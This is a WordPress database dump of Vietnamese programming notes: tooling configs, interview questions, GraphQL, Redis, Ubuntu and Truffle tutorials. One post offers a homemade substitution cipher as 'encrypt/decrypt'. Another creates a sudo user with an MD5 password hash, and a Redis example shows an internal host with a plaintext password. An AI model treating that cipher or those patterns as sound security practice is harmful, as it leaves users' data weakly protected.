(2036, 1, '2022-02-20 01:00:16', '2022-02-20 01:00:16', '<h2>1. Cài đặt thư viện</h2>\r\n<blockquote>\r\nnpm i -D typescript ts-node @types/node\r\n</blockquote>\r\n\r\n<h2>2. Tạo file tsconfig.json</h2>\r\n<blockquote>\r\nnpx tsc --init\r\n</blockquote>\r\n-- Sử file tsconfig.json như sau\r\n<pre>\r\n{\r\n    \"compilerOptions\": {\r\n        /* Language and Environment */\r\n        \"target\": \"es6\",                                     /* Option: \"es3\", \"es5\", \"es6\", \"esnext\" ==> Sử dụng phiên bản javascript sau khi được transpiler*/\r\n        \"lib\": [ \"es6\" ],                                    /* Specify a set of bundled library declaration files that describe the target runtime environment. */\r\n\r\n        \"experimentalDecorators\": true,                      /* Sử dụng Decorator trong Typescript */\r\n        \"emitDecoratorMetadata\": true,                       /* Sử dụng Decorator trong Typescript. */\r\n        \r\n        /* Modules */\r\n        \"module\": \"commonjs\",                                /* Option: \"commonjs\", \"amd\", \"umd\", \"system\", \"esnext\", \"es6\", \"es2020\" */\r\n        // \"rootDir\": \"./\",                                  /* Specify the root folder within your source files. */\r\n        \"moduleResolution\": \"node\",                          /* Cũng chưa rõ là gì. */\r\n  \r\n        /* ====== Emit ====== */\r\n        \"sourceMap\": false,                                  /* Create source map files for emitted JavaScript files. */\r\n        \"outDir\": \"./dist\",                                  /* Vị trí thư mục sau khi được transpiler */\r\n        \"removeComments\": true,                              /* Xóa comment khi transpiler ra javascript. */\r\n        \"newLine\": \"lf\",                                     /* Option: \"crlf\", \"lf\" */\r\n\r\n        /* ====== Interop Constraints ====== */\r\n        \"esModuleInterop\": true,                             /* Chưa rõ lắm :((\r\n\r\n        /* ====== Completeness ====== */\r\n        // \"strict\": true,                                   /* Nếu chọn \"true\" ==> bật tất cả các quy định ở dưới lên. */\r\n    },\r\n    \"include\": [\r\n        \"src/**/*\"\r\n    ],\r\n    \"exclude\": [\r\n        \"node_modules\"\r\n    ]\r\n}\r\n</pre>\r\n\r\n<h2>3. Tạo thêm command trong package.json</h2>\r\n<blockquote>\r\n\"scripts\": {\r\n    \"tsc-watch\": \"tsc --watch --project tsconfig.json\",\r\n    \"dev-test\": \"nodemon --watch src src/test.ts\",\r\n},\r\n</blockquote>', 'NodeJS configs: P1. Cài đặt Typescript', '', 'publish', 'open', 'open', '', 'su-dung-prettier-va-eslint-co-ban', '', '', '2022-02-26 03:53:11', '2022-02-26 03:53:11', '', 0, 'https://duycode.com/?p=2036', 0, 'post', '', 0),
(2050, 1, '2022-02-20 02:00:37', '2022-02-20 02:00:37', '<h2>I. Cài đặt thư viện</h2>\r\n<pre>\r\nnpm i -D prettier eslint\r\n\r\n// Thư viện để kết hợp prettier với eslint\r\nnpm i -D eslint-config-prettier eslint-plugin-prettier\r\n\r\n// Thư viện để eslint nhận dạng typescript\r\nnpm i -D @typescript-eslint/eslint-plugin @typescript-eslint/parser eslint-plugin-import\r\n\r\n// Thư viện để sử dụng cú pháp chuẩn của bnb\r\nnpm i -D eslint-config-airbnb-typescript\r\n</pre>\r\n\r\n<h2>II. Config Prettier</h2>\r\n- Tạo file config tại thư mục gốc: /.prettierrc.js hoặc: /prettier.config.js\r\n<pre>\r\nmodule.exports = {\r\n    useTabs: false,                         // sử dụng tab đầu dòng\r\n    tabWidth: 4,                            // chiều rộng tab\r\n    endOfLine: \'lf\',\r\n    semi: false,                            // dấu ; cuối dòng\r\n    trailingComma: \'all\',                   // điền dấu , ở item cuối cùng của object\r\n    bracketSpacing: true,                   // khoảng trắng { a } thay vì {a}\r\n    singleQuote: true,                      // dấu nháy \'\' thay vì \"\"\r\n    printWidth: 100,                        // chiều dài 1 dòng: 120\r\n    arrowParens: \'avoid\',                   // arrowfunction dạng: a => {} thay vì (a)=>{}\r\n    htmlWhitespaceSensitivity: \"ignore\",    // <a></a> không cho xuống dòng ngu ngu dạng <a></a  \\n >\r\n    quoteProps: \"as-needed\",                // Bỏ dấu ngoặc đơn ở key của Object\r\n}\r\n</pre>\r\n\r\n<h2>II. Config ESlint </h2>\r\n<h3>1. Tạo file config tại thư mục gốc: /.eslintrc.js</h3>\r\n<pre>\r\nmodule.exports = {\r\n	root: true,\r\n	parser: \'@typescript-eslint/parser\',\r\n	extends: [\r\n		\'eslint:recommended\',\r\n		\'plugin:@typescript-eslint/recommended\',\r\n		\'airbnb-base\',\r\n		\'airbnb-typescript/base\',\r\n		\'prettier\',\r\n	],\r\n	plugins: [\'@typescript-eslint\', \'prettier\'],\r\n	parserOptions: {\r\n		project: [\'./tsconfig.json\'],\r\n	},\r\n	rules: {\r\n		\'prettier/prettier\': [\'error\'],\r\n		\'no-unused-vars\': 0, // khai báo biến mà không sử dụng sẽ lỗi\r\n		\'@typescript-eslint/no-unused-vars\': 0,\r\n		\'@typescript-eslint/no-explicit-any\': 0, // không cho dùng type any\r\n		\'no-console\': 0,\r\n		\'no-useless-concat\': 0, // Bắt buộc viết 1 chuỗi, ko để dạng cộng 2 chuỗi, vcc\r\n		\'prefer-template\': 0, // Bắt buộc dùng template string khi cộng chuỗi, vcc\r\n		\'import/prefer-default-export\': 0, // Nếu export 1 biến thì mặc định phải là default, vcc\r\n	},\r\n}\r\n\r\n</pre>\r\n\r\n<h3>2. Tạo file ignore tại thư mục gốc: /.eslintignore </h3>\r\n<pre>\r\nnode_modules\r\ndist\r\n</pre>\r\n\r\n\r\n', 'NodeJS configs: P2. Cài đặt Eslint và Prettier', '', 'publish', 'open', 'open', '', 'nodejs-configs-p2-cai-dat-eslint-va-prettier', '', '', '2022-02-26 04:03:07', '2022-02-26 04:03:07', '', 0, 'https://duycode.com/?p=2050', 0, 'post', '', 0),
(2064, 1, '2022-03-08 04:19:35', '2022-03-08 04:19:35', '<pre>\r\nclass StringUtils {\r\n    public static readonly charset: string =\r\n        \'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\'\r\n\r\n    public static generateCharset = (privateKey: string, charset?: string): string => {\r\n        let tempString = charset || StringUtils.charset\r\n        let result = \'\'\r\n        for (let i = 0; i < StringUtils.charset.length; i += 1) {\r\n            const kIndex = i % privateKey.length\r\n            const charCode = privateKey.charCodeAt(kIndex)\r\n            const tIndex = charCode % tempString.length\r\n\r\n            result = tempString[tIndex] + result\r\n            tempString = tempString.substring(tIndex + 1) + tempString.substring(0, tIndex)\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static randomId = (): string => {\r\n        const now = new Date().getTime().toString(36) // l0u2ifgu - ... - ... - todo\r\n        return now\r\n    }\r\n\r\n    public static randomString = (length: number, charset?: string): string => {\r\n        const characters = charset || StringUtils.charset\r\n        let result = \'\'\r\n        for (let i = 0; i < length; i += 1) {\r\n            result += characters.charAt(Math.floor(Math.random() * characters.length))\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static encript = (rootString: string, privateKey: string): string => {\r\n        const hash = StringUtils.generateCharset(privateKey)\r\n        let result = \'\'\r\n        for (let i = 0; i < rootString.length; i += 1) {\r\n            const index = StringUtils.charset.indexOf(rootString[i])\r\n            if (index === -1) {\r\n                result += rootString[i]\r\n            } else {\r\n                result += hash[index]\r\n            }\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static decript = (cipherText: string, privateKey: string): string => {\r\n        const hash = StringUtils.generateCharset(privateKey)\r\n        let result = \'\'\r\n        for (let i = 0; i < cipherText.length; i += 1) {\r\n            const index = hash.indexOf(cipherText[i])\r\n            if (index === -1) {\r\n                result += cipherText[i]\r\n            } else {\r\n                result += StringUtils.charset[index]\r\n            }\r\n        }\r\n        return result\r\n    }\r\n\r\n    public static convertViToEn = (root: string): string =>\r\n        root\r\n            .normalize(\'NFD\')\r\n            .replace(/[\\u0300-\\u036f]/g, \'\')\r\n            .replace(/đ/g, \'d\')\r\n            .replace(/Đ/g, \'D\')\r\n\r\n    public static formatNumber = (number: number, fixed = 3, part = 3, sec = \',\', dec = \'.\') => {\r\n        const regex = \'\\\\d(?=(\\\\d{\' + part + \'})+\' + (fixed > 0 ? \'\\\\D\' : \'$\') + \')\'\r\n        return number\r\n            .toFixed(fixed)\r\n            .replace(\'.\', dec)\r\n            .replace(new RegExp(regex, \'g\'), \'$&\' + sec)\r\n    }\r\n}\r\n\r\nexport default StringUtils\r\nexport const { formatNumber } = StringUtils\r\nexport const { randomString } = StringUtils\r\nexport const { encript } = StringUtils\r\nexport const { decript } = StringUtils\r\nexport const { convertViToEn } = StringUtils\r\n\r\n</pre>', 'Encrypt và Decrypt trong Javascript', '', 'publish', 'open', 'open', '', 'encrypt-va-decrypt-trong-javascript', '', '', '2022-08-22 05:02:00', '2022-08-22 05:02:00', '', 0, 'https://duycode.com/?p=2064', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(2069, 1, '2022-03-15 16:15:49', '2022-03-15 16:15:49', '<details><summary>Câu 1: Những vấn đề ảnh hưởng đến tốc độ chương trình</summary>\r\n1. Cache\r\n- Bộ nhớ máy tính lưu ở 3 nơi: ổ cứng (SSD), RAM và CPU --> cache lưu ở CPU\r\n- Cache lưu ở đâu: Client(image, css, js) --> Proxy(file tĩnh..) --> Server Cache --> Database Cache\r\n- Cache ở CPU có 3 cấp độ: L1 (chính) , L2 (thứ cấp), L3 (dự phòng cho L1, L2)\r\n- Khi một chương trình khởi động trên máy tính của bạn, dữ liệu sẽ truyền từ RAM vào bộ đệm L3, rồi L2 và đến L1 sẽ rót trực tiếp dữ liệu cho các nhân CPU xử lý. Trong khi chương trình đang chạy, CPU tìm kiếm thông tin cần chạy, bắt đầu từ bộ đệm L1 và làm việc ngược từ đó.\r\n\r\n2: Bound:\r\n* Khi một thành phần hoạt động không theo kịp thành phần khác, khiến thành phần khác phải rảnh rỗi vì không có dữ liệu làm việc, thành phần chậm chạp kia trở thành một bottle-neck, kéo lùi hiệu năng của toàn bộ hệ thống -> gọi là bound.\r\n- CPU Bound: Giới hạn bởi tốc độ xử lý của CPU\r\n- Memory Bound: Giới hạn bởi dung lượng khả dụng và tốc độ truy cập của bộ nhớ\r\n- Cache Bound: Giới hạn bởi số lượng ô nhớ và tốc độ của các thanh cache khả dụng\r\n- I/O Bound: Tốc độ thực hiện tiến trình bị giới hạn bởi tốc độ của các tác vụ IO \r\nDo tốc độ I/O thường rất chậm so với các thành phần còn lại, bottle-neck thường xuyên xảy ra ở đây\r\n</details>\r\n\r\n<details><summary>Câu 2. Kiến trúc NodeJS</summary>\r\n- NodeJs được viết bằng Javascript và C++, 2 Dependencie lớn nhất là V8 và LibUV\r\n- V8 bao gồm: call stack(LIFO: last in first out)  và memory heap.\r\n- LIBUV viết bằng C++, xử lý các tác vụ I/O không đồng bộ, \r\n- LIBUV bao gồm: event-queue, event-loop(cho các tác vụ đơn giản) và thread pool(các tác vụ nặng)\r\n<img src=\"https://ren0503.github.io/assets/img/nodejs/threadpool.png\" alt=\"\" />\r\n<img src=\"https://ren0503.github.io/assets/img/nodejs/node.jpg\" alt=\"\" />\r\n- Khi có nhiều request được gửi từ nhiều client trong cùng một thời điểm, các request này sẽ được đưa vào event queue hoạt động theo cơ chế FIFO - First In First Out.\r\n- Request được lấy ra ở event queue sẽ được đưa đến call stack để xử lý. Ở đây, trên server sẽ thực thi các hàm để có kết quả trả về cho request đó.\r\n- Khi trong call stack thực thi một hàm của một request, hàm này cần phải query dữ liệu trong DB. Vì query vào DB là hoạt động I/O được quy định trong Node APIs. Do vậy nó không thể thực thi trên call stack được.\r\n- Để kiểm tra hàm trong call stack có được Node APIs đảm nhiệm không, nó sẽ có một adapter chuyên check việc hàm đó có trong Node APIs hay không.\r\n- Nếu hàm không thực thi một tác vụ liên quan đến I/O thì adapter sẽ trả về false. Ví dụ, request yêu cầu lấy thời gian của server, khi đó chỉ cần return new Date() rồi response về cho client. Như vậy hàm mà có return new Date() không liên quan đến Node APIs nên nó sẽ được xử lý ngay trong call stack với thời gian rất nhanh và trả về cho client luôn.\r\n- Nếu nó thực thi một tác vụ liên quan đến I/O thì adapter sẽ trả về true. Ví dụ như việc query vào DB, sẽ cần một thời gian nhất định. Khi đó Node APIs biết mình cần phải xử lý cái hàm đó. Nó sẽ lấy ra khỏi call stack để cho call stack thực thi các hàm khác. Đồng thời phân cho 1 thread có trong thread pool để xử lý tác vụ I/O trong hàm vừa lấy ra.\r\n- Thread này sẽ được xử lý trong handle thread, lấy dữ liệu trong DB, sau khi xong sẽ được đẩy xuống callback queue chờ ngày được lên lại call stack\r\n- Thread pool cung cấp 4 thread(có thể config lên 128 thread) hoàn toàn tách biệt với signle thread trong event loop.\r\n</details>\r\n\r\n<details><summary>Khác</summary>\r\ntheo style phỏng vấn của mình thì tùy vào CV của bạn và yêu cầu công việc trong JD. Loanh quanh mấy cái đó + 1 số kiến thức phổ quát must have chứ không theo style đánh đố của nhiều bên. Vị trí nodejs thì chắc tuyển backend nên sẽ hỏi những thứ liên quan backend gồm thiết kế API, ngôn ngữ, database, deployment\r\n- Nhiều chỗ sẽ bắt đầu hỏi từ REST, OOP, functional programing cho tới SOLID rồi mấy cái của lập trình nói chung. Mình thì ko hay hỏi mấy cái này lắm 😊))) \r\n- Kiến thức phổ thông thì 1 số kiến thức liên quan tới node như bạn hiểu thế nào về promise, async await, event loop, single thread, engine v8,... hoặc kiến thức chung như http request, session, cookie, authen,... 1 trong những thứ mình rất thích hỏi và cũng thấy nhiều chỗ hỏi chính là việc bạn có hiểu sâu về cách website/http request hoạt động không, từ đó có hiểu quá trình authen/author như thế nào không hay chỉ biết dùng lib,...\r\n- Database thì tùy xem bạn có kiến thức về db sâu tới đâu sẽ hỏi tới đó. Càng biết sâu thì người ta càng hỏi sâu thôi không có giới hạn gì cả. Từ cách thiết kế, modeling, index, query,... Chí ít thì cũng phải biết về sql, nosql, dùng được orm hoặc query builder, tránh được sql injection,... \r\n- Deployment/tooling thì có thể sẽ hỏi bạn thường làm việc trong môi trường gì, deploy thế nào, có biết docker/k8s gì không (đây chỉ là điểm cộng thôi ko bắt buộc)\r\n- Phần kiến thức này nói chung cũng chỉ xoay quanh những thứ mà JD yêu cầu thôi. Ví dụ công ty mình đang làm với node + mongo + aws thì sẽ hỏi xem bạn biết những thứ này tới đâu.\r\n- Cái mà mình hay tập trung nghe là trong các dự án cũ bạn đã làm gì, học được gì, gặp khó khăn gì và vượt qua thế nào, có tâm đắc kiến thức gì không. Đây là đánh giá về quá khứ của bạn. Ngoài ra sẽ hỏi thêm cách bạn học tập và thu nạp kiến thức bên ngoài hoặc khi rảnh rỗi, đây là đánh giá về tương lai học hỏi của bạn. \r\n1 năm kinh nghiệm thì mình nghĩ là sẽ không bị hỏi quá khó đâu vì quá trình học tập phía trước vẫn còn rất dài. Chỉ cần thể hiện được mình HIỂU những thứ mình đã TỪNG LÀM và khả năng học hỏi là được.\r\n\r\nVới title Junior, có nghĩa là bạn có thể tự mình xử lý được các task cơ bản như dựng một API, viết middware, validate dữ liệu, gọi api của bên thứ 3, support integrate với FE, query database… Từ yêu cầu đấy có thể list ra một vài skill cơ bản như\r\n- hiểu các layer của app nodejs, http, api…\r\n- có kinh nghiệm với ít nhất 1 framwork nodejs nào đó, nắm được cách giải quyết vấn đề của framework đó\r\n- năm rõ nodejs và một số lib phổ biến\r\n- hiểu được cơ chế hoạt động của client - server: Restfull, stateless - statefull, websocket, jwt, graphql…\r\n- thao tác thành thạo với db: repository, orm, sql query, mongo…\r\n- hiểu cơ bản về workflow: nói chuyện với FE, gitflow, postman, swagget, chome debugger\r\n- hiểu được cách chạy của node, ưu nhược điểm và một số ứng dụng cũng như design parterns với node…\r\n\r\nEm mới đi phỏng vấn nodejs ở vccorp về đây.\r\nHọ hỏi điểm mạnh điểm yếu của nodejs, kỹ thuật cache nhiều tầng ( nếu miss thì làm thế nào), hỏi chi tiết các thuật toán mã hóa, cách phân chia các replication trong mongodb sao cho miss ít nhất, chút kiến thức về hệ điều hành ... vv còn nhiều lắm, mà em không nhớ, ấn tượng mỗi là họ hỏi chi tiết mấy cái thuật toán mã hóa ( cái này lúc học trên trường có môn atbm thì em nhớ chứ giờ em quên cmnr, SHA, md5, tri-des .vv ).\r\n</details>\r\n\r\n\r\n', 'Câu hỏi NodeJs', '', 'publish', 'open', 'open', '', 'cau-hoi-nodejs', '', '', '2022-08-18 15:40:48', '2022-08-18 15:40:48', '', 0, 'https://duycode.com/?p=2069', 0, 'post', '', 0),
(2071, 1, '2022-03-16 05:12:54', '2022-03-16 05:12:54', 'Mình mới đi phỏng vấn xong nên chia sẻ với ae 1 chút về vòng phỏng vấn kĩ thuật junior \r\n1: Phân biệt props, state là gì. có thay đổi giá trị của props được không nếu được thì làm như nào.\r\n2: SetState là hàm đồng bộ hay bất đồng bộ. Sẽ như nào nếu hàm này là hàm đồng bộ.\r\n3: DOM ảo là gì, quá trình render, re-render được thực hiện như thế nào.\r\n4: Em code chủ yếu là function component hay class component.\r\n5: Em hãy trình bày về Lifecycle: tùy theo mình đang làm việc với react version bao nhiêu mà trình bày ở đây mình làm việc với version < 16.3 nên trình bày lifecycle cũ. Còn nếu xài từ 16.3 trở lên thì có thể trình bày theo lifecycle mới + nói thêm 1 chút về lifecycle cũ.\r\n6: componentwillreceiveprops được sử dụng trong trường hợp nào.\r\n7: shoudcomponentupdate được sử dụng trong trường hợp nào return true/false có ý nghĩa gì.\r\n8: Trước khi có version 16.8 code function component được sử dụng để làm gì.\r\n9: Trong function component(hooks) lifecycle được viết ở đâu. Có nhưng loại nào.\r\n10: Tại sao team Reacr lại viết chung 3 lifecycle vào trong useEffect mà không tách riêng ra.\r\n11: Giải thích ý nghĩa của từng Dependency trong useEffect.\r\n12: Ngoài useEffect ra em còn biết về các hooks nào khác không, em đã custom 1 hooks nào chưa.\r\n13: HOC là gì.\r\n14: Promise, callback, asyn/await là gì.\r\n15: Trình bày về lý do khi nào nên sử dụng redux.\r\n16: Ngoài redux ra còn có cách nào để share dữ liệu không.\r\n17: Chỉ ra 1 vài ưu điểm của state management mà em lựa chọn.\r\n18: Em thường làm việc với các middleware nào.\r\n19: Em biết là redux-thunk không.\r\n20: Em biết Sass không.\r\n21: Quy tắc đặt tên BEM.\r\n22: Ngoài ra em có biết thêm về thư viện hỗ trợ việc css hay xây dựng UI nào không(tailwind,....)\r\n23: Em biết TypeScript không.\r\n24: Em có biết về thư viện hay framework nào hỗ trợ server-render-side không.\r\n25: Theo em ReactJS là CRS hay SRS.\r\n\r\nMình nhớ sương sương như vậy. Buổi phỏng vấn của mình kéo dài khoảng 40 -45 phút.', 'Câu hỏi ReactJs', '', 'publish', 'open', 'open', '', 'cau-hoi-reactjs', '', '', '2022-08-16 00:01:14', '2022-08-16 00:01:14', '', 0, 'https://duycode.com/?p=2071', 0, 'post', '', 0),
(2080, 1, '2022-04-06 06:04:33', '2022-04-06 06:04:33', '<img src=\"https://graphql.org/img/og-image.png\" alt=\"https://graphql.org/img/og-image.png\" />\r\n<a href=\"https://graphql.org/code/#javascript\" rel=\"noopener\" target=\"_blank\">https://graphql.org/code/#javascript</a>\r\n<pre>\r\nimport { GraphQLInt, GraphQLList } from \'graphql\'\r\nimport { graphql, GraphQLSchema, GraphQLObjectType, GraphQLString, GraphQLFloat } from \'graphql\'\r\n\r\nconst dataFake = async () => {\r\n    return {\r\n        id: 232,\r\n        className: \'12A2\',\r\n        students: [\r\n            { id: 1, name: \'Jack\', age: 18, email: \'jack@gmail.com\', mark: 9.8 },\r\n            { id: 2, name: \'Peter\', age: 19, email: \'peter@gmail.com\', mark: 7.2 },\r\n            { id: 3, name: \'John\', age: 18, email: \'joshn@gmail.com\', mark: 6.5 },\r\n            { id: 4, name: \'Devil\', age: 18, email: \'devil@gmail.com\', mark: 4.2 },\r\n            { id: 5, name: \'Anna\', age: 19, email: \'anna@gmail.com\', mark: 5.8 },\r\n            { id: 6, name: \'Oliver\', age: 18, email: \'oliver@gmail.com\', mark: 9.2 },\r\n        ],\r\n    }\r\n}\r\n\r\nconst teacherFake = async (filter: { id: number }) => {\r\n    const teachersFake = await (async () => [\r\n        { id: 1, name: \'Hanna\', subject: \'Math\' },\r\n        { id: 2, name: \'Dr. Strangle\', subject: \'Chemistry\' },\r\n    ])()\r\n\r\n    return teachersFake.filter(item => item.id === filter.id)\r\n}\r\n\r\nconst studentType = new GraphQLObjectType({\r\n    name: \'students\',\r\n    fields: {\r\n        id: { type: GraphQLInt },\r\n        name: { type: GraphQLString },\r\n        age: { type: GraphQLInt },\r\n        email: { type: GraphQLString },\r\n        mark: { type: GraphQLFloat },\r\n    },\r\n})\r\n\r\nconst teacherType = new GraphQLObjectType({\r\n    name: \'teacher\',\r\n    fields: {\r\n        id: { type: GraphQLInt },\r\n        name: { type: GraphQLString },\r\n        subject: { type: GraphQLString },\r\n    },\r\n})\r\n\r\nconst rootSchema = new GraphQLSchema({\r\n    query: new GraphQLObjectType({\r\n        name: \'rootSchema\',\r\n        fields: {\r\n            id: { type: GraphQLInt },\r\n            className: { type: GraphQLString },\r\n            students: { type: new GraphQLList(studentType) },\r\n            teachers: {\r\n                type: new GraphQLList(teacherType),\r\n                description: \'List of all Teacher\',\r\n                args: {\r\n                    id: { type: GraphQLInt },\r\n                },\r\n                resolve: async (parent, args, context, info) => {\r\n                    return await teacherFake({ id: args.id })\r\n                },\r\n            },\r\n        },\r\n    }),\r\n})\r\n\r\nconst studentGrapQlstart = async () => {\r\n    const response = await graphql({\r\n        schema: rootSchema,\r\n        source: \'query { id, className, students { name, age }, teachers(id:1) { id, name } }\',\r\n        rootValue: await dataFake(),\r\n    })\r\n    console.log(JSON.stringify(response))\r\n}\r\n\r\nstudentGrapQlstart()\r\n</pre>', 'GraphQL cơ bản', '', 'publish', 'open', 'open', '', 'graphql-co-ban', '', '', '2022-04-09 06:03:26', '2022-04-09 06:03:26', '', 0, 'https://duycode.com/?p=2080', 0, 'post', '', 0),
(2097, 1, '2022-04-11 13:47:40', '2022-04-11 13:47:40', 'Câu 1: Các kiểu dữ liệu trong MySQL\r\n- Kiểu Int: TinyInt, smallInt, MediumInt, Int, BigInt\r\n- Kiểu số thực: Float(4 byte), Double(8 byte)\r\n- Date, DateTime, Timestap (TimeStamp chuyển sang UTC khi lưu trữ và convert ngược lại khi lấy ra)\r\n- Char(chiều dài cố định, hiệu suất nhanh hơn), Varchar\r\n\r\nCâu 1: Phân biệt Left Join, Right Join, Inner Join trong SQL\r\n\r\nCâu 2: Join collection trong MongoDB\r\n- Dùng: aggregate với $lookup hoặc trong mongoose dùng populate...\r\n\r\nCâu 3: Index trong Database là gì\r\n- INDEX giúp tăng tốc các truy vấn SELECT chứa các mệnh đề WHERE hoặc ORDER\r\n- INDEX làm chậm việc dữ liệu nhập vào với các lệnh UPDATE và INSERT. Các chỉ mục có thể được tạo hoặc xóa mà không ảnh hưởng tới dữ liệu.\r\n- Các kiểu index trong SQL:\r\n + Single-Column Index\r\n + Unique Index\r\n + Composite Index\r\n + Implicit Index (Index ngầm định): được tạo tự động cho các ràng buộc Primary key và các ràng buộc Unique\r\n- Các kiểu index trong MongoDB:\r\n + Single Field Indexes\r\n + Unique Indexes\r\n + Compound Indexes\r\n\r\nCâu 3: Tối ưu hiệu suất Database\r\n- Đánh index\r\n- Sử dụng từ khoá Like phải hợp lý: Tránh dùng \'%\' phía trước --> phải duyệt toàn bộ bản ghi\r\n- Tránh sử dụng hàm thao tác lên column -> nên thao tác lên dữ liệu --> tránh duyệt toàn bộ bản ghi\r\n- Tránh sử dụng điều kiện với các loại khác kiểu\r\n\r\nCâu 4: Một số syntax cơ bản:\r\n- UNION: gộp 2 câu lệnh select\r\n- DISTINCT: loại bỏ giá trị trùng lặp\r\n- COUNT: đếm số bản ghi\r\n- Store procedure: cũng giống như tạo 1 function vậy :D\r\n', 'Câu hỏi Database - SQL', '', 'publish', 'open', 'open', '', 'cau-hoi-database', '', '', '2022-08-16 00:00:17', '2022-08-16 00:00:17', '', 0, 'https://duycode.com/?p=2097', 0, 'post', '', 0),
(2103, 1, '2022-04-14 03:00:44', '2022-04-14 03:00:44', '// Xem user hiện tại\r\n$ whoami // Single liner to create a sudo user with home directory and password.\r\n$ useradd -m -p $(openssl passwd -1 ${PASSWORD}) -s /bin/bash -G sudo ${USERNAME} \r\n \r\n</h2>*. Một số config cơ bản</h2>\r\n1. Icon chỉ hiện thị trên Dock của màn hình đang bật\r\n<blockquote>isolate-monitors = true</blockquote>\r\n\r\n', 'Ubuntu Cơ bản', '', 'publish', 'open', 'open', '', 'ubuntu-co-ban', '', '', '2023-09-04 10:05:46', '2023-09-04 10:05:46', '', 0, 'https://duycode.com/?p=2103', 0, 'post', '', 0),
(2106, 1, '2022-04-14 08:42:21', '2022-04-14 08:42:21', '1. Cài đặt Redis-CLI\r\n-- bla bla bla\r\n2. Connect vào Redis\r\n<pre>\r\n// connect như sau\r\nredis-cli\r\n## redis-cli -h 10.0.46.12 -p 6379 -a masredispass\r\n\r\n\r\nPING                 // ping thử kết nối\r\nkeys *               // xem tất cả key\r\nkeys *bcde*          // tìm key có chữ \"bcde\"\r\nTYPE abcdef          // xem kiểu dữ liệu của key \"abcdef\"\r\n</pre>\r\n\r\n', 'Redis cơ bản', '', 'publish', 'open', 'open', '', 'redis-co-ban', '', '', '2022-08-20 03:38:54', '2022-08-20 03:38:54', '', 0, 'https://duycode.com/?p=2106', 0, 'post', '', 0),
(2110, 1, '2022-04-21 02:28:58', '2022-04-21 02:28:58', '1. IDE online: https://remix.ethereum.org/\r\n2. Connect local với IDE online\r\n- Setup: npm install -g @remix-project/remixd\r\n- Connect: \r\n<blockquote>PS D:\\Learning\\blockchain\\startone> remixd -s ./ --remix-ide https://remix.ethereum.org</blockquote>\r\n\r\n', 'Solidity cơ bản', '', 'publish', 'open', 'open', '', 'solidity-co-ban', '', '', '2022-04-21 02:28:58', '2022-04-21 02:28:58', '', 0, 'https://duycode.com/?p=2110', 0, 'post', '', 0),
(2112, 1, '2022-04-22 01:55:29', '2022-04-22 01:55:29', '<h2>I. Dựng project cơ bản</h2>\r\n1. Dựng project React\r\n<blockquote>npx create-react-app demo-project</blockquote>\r\n- Từ giờ, các lệnh cmd sẽ sử dụng trong folder demo-project\r\n\r\n2. Cài đặt truffle\r\n<a href=\"https://trufflesuite.com/\" rel=\"noopener\" target=\"_blank\">https://trufflesuite.com/</a>\r\n<blockquote>npm install truffle -g</blockquote>\r\n\r\n- Tạo project react, cài đặt thêm truffle\r\n<blockquote>truffle init</blockquote>\r\n\r\n- Tại file ./truffle-config.js\r\n<pre>\r\n    development: {\r\n     host: \"127.0.0.1\",   \r\n     port: 7545,            // Đoạn này phải đổi sang cổng 7545 cho giống bên ganache\r\n     network_id: \"*\",    \r\n    },\r\n</pre>\r\n\r\n3. Cài đặt ứng dụng: Ganache\r\n<a href=\"https://trufflesuite.com/ganache/\" rel=\"noopener\" target=\"_blank\">https://trufflesuite.com/ganache/</a>\r\n- Tạo workspace mới --> trỏ đến file truffle-config.js (trong project react)\r\n- Chạy đoạn migrate đầu tiên\r\n<blockquote>truffle migrate</blockquote>\r\n\r\n<h2>Sử dụng truffle</h2>\r\n1. Tạo file contract (solidity) tiếp theo trong thư mục contract\r\n2. Compile ra file json\r\n<blockquote>truffle compile</blockquote>\r\n3. Tạo file migrate\r\n- Tên file bắt đầu bằng con số: 1_, 2_\r\n4. Migrate: đưa lên host hay gì gì đó\r\n<blockquote>truffle migrate</blockquote>\r\n5. Vào ứng dụng ganache kiếm tra\r\n\r\n6. Khi thay đổi code file .sol cần migrate lại\r\n<blockquote>truffle migrate --reset</blockquote>\r\n\r\n-- Xem list accounts (trong console truffle)\r\n<blockquote>accounts</blockquote>\r\n\r\n<h2>Truy cập biến bằng truffle</h2>\r\n1. Luôn bật ganache\r\n2. Dùng terminal\r\n<blockquote>truffle console</blockquote>\r\n3. Bắt đầu dùng console\r\n<pre>\r\n// Tạo biến\r\nconst instance = await Faucet.deployed()\r\n// Show đối tượng\r\ninstance\r\n// lấy biến trong đối tượng\r\nconst snd = await instance.so_nguyen_duong()\r\n// xem biến\r\nsnd\r\nsnd.toString()\r\n</pre>\r\n\r\n4. Có thể dùng console với web3\r\n<pre>\r\n//Faucet.abi là constract, địa chỉ đằng sau là địa chỉ của contract đó (xem phần contract trên ganache)\r\nconst instance = new web3.eth.Contract(Faucet.abi, \"0x24DB0ca0B537B89113Bfcd300D4Ee36167789682\")\r\n//xem instance\r\ninstance\r\n// lấy 1 biến\r\nconst snd = await instance.methods.so_nguyen_duong().call()\r\n// xem biến đó\r\nsnd\r\n</pre>\r\n\r\n<h2>Chuyển tiền bằng web3\r\nVẫn dùng console\r\n<blockquote>web3.eth.sendTransaction({from: accounts[0], to: \"0x6cF16A6f606E0dBDe888594515f148b83B348333\", value: \"10000000000000000000\"}) </blockquote>\r\n\r\n\r\n\r\n\r\n\r\n', 'Sử dụng Truffle cơ bản', '', 'publish', 'open', 'open', '', 'su-dung-truffle-co-ban', '', '', '2022-08-07 00:10:01', '2022-08-07 00:10:01', '', 0, 'https://duycode.com/?p=2112', 0, 'post', '', 0),
